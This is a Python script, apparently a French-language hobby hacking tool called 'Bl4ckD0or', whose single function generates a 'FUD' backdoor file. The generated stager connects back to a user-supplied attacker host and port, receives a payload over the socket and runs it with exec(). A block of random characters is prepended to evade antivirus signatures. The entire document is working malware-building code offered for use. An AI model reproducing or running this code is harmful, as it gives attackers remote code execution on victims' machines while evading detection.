#coding:utf-8
import os
import sys
import random
import time
from colorama import Fore, init
init()

croix = Fore.RESET+"["+Fore.CYAN+"+"+Fore.RESET+"]"
blackdoor = croix+"[Bl4ckD0or]"
warning = "/!\ "

def exit():
    print(croix+" Bye...")
    sys.exit()

def clear():
    try:
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
    except:
        pass
def menu():
    clear()
    menu = """ ____  _ _  _        _    ____   ___             
| __ )| | || |   ___| | _|  _ \ / _ \  ___  _ __ 
|  _ \| | || |_ / __| |/ / | | | | | |/ _ \| '__|
| |_) | |__   _| (__|   <| |_| | |_| | (_) | |   
|____/|_|  |_|  \___|_|\_\____/ \___/ \___/|_|"""
    print(menu)
def menuFonctions():
    print("""
+-------------------------------+
|           Fonctions           |
+-------------------------------+
| [0] Quitter le programme      |
| [1] Faire une backdoor FUD    |
+-------------------------------+    
    """)

def pythonBackdoor():
    liste = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9','~','!','@','#','$','%','^','&','*','(',')','-','_','=','+','[',']','{','}',';',':',',','.','<','>','/','?' ]
    contenue = ""
    i = 0

    while i < 10000:
        r = random.choice(liste)
        contenue += r
        i +=1
    contenue = str(contenue)
    LHOST = input(blackdoor+"[BackDoor][LHOST : ")
    LPORT = input(blackdoor+"[BackDoor][LPORT : ")
    VAR = input(blackdoor+"[BackDoor][VarName (More FUD) : ")

    code = """#coding:utf-8
#RANDOM
import socket
import struct
import time
host = "HOST"
port = PORT
time.sleep(3)
for x in range(10):
	try:
		VAR_NAME=socket.socket(2,socket.SOCK_STREAM)
		VAR_NAME.connect((host, port))
		break
	except:
		time.sleep(5)
l=struct.unpack('>I',VAR_NAME.recv(4))[0]
d=VAR_NAME.recv(l)
while len(d)<l:
	d+=VAR_NAME.recv(l-len(d))
exec(d,{'s':VAR_NAME})
    """
    code = code.replace("RANDOM", contenue)
    code = code.replace("HOST", LHOST)
    code = code.replace("PORT", LPORT)
    code = code.replace("VAR_NAME", VAR)

    test = os.path.exists('output')
    if test == True:
        pass
    else:
        os.mkdir('output')

    while True:
        file_name = input(blackdoor+"[BackDoor][File_name : ")
        file_name += ".py"
        try:
            fichier = open("output/{}".format(file_name), "r")
            fichier.close()
            print(Fore.RED+warning+"[{}] existe déjà! Veuillez choisir un autre nom de fichier!")
            time.sleep(2)
            clear()
            continue
        except:
            fichier = open("output/{}".format(file_name), "w")
            fichier.write(code)
            fichier.close()
            break

def main():
    while True:
        menu()
        menuFonctions()
        choice = input(blackdoor+"[Entrez votre choix : ")
        if choice == "0":
            exit()
        elif choice == "1":
            pythonBackdoor()
        else:
            print(Fore.RED+warning+"[{}] ne fait pas partit des choix!".format(choice)+Fore.RESET)
            time.sleep(2)
            continue

try:
    main()
except KeyboardInterrupt:
    exit()
except:
    pass
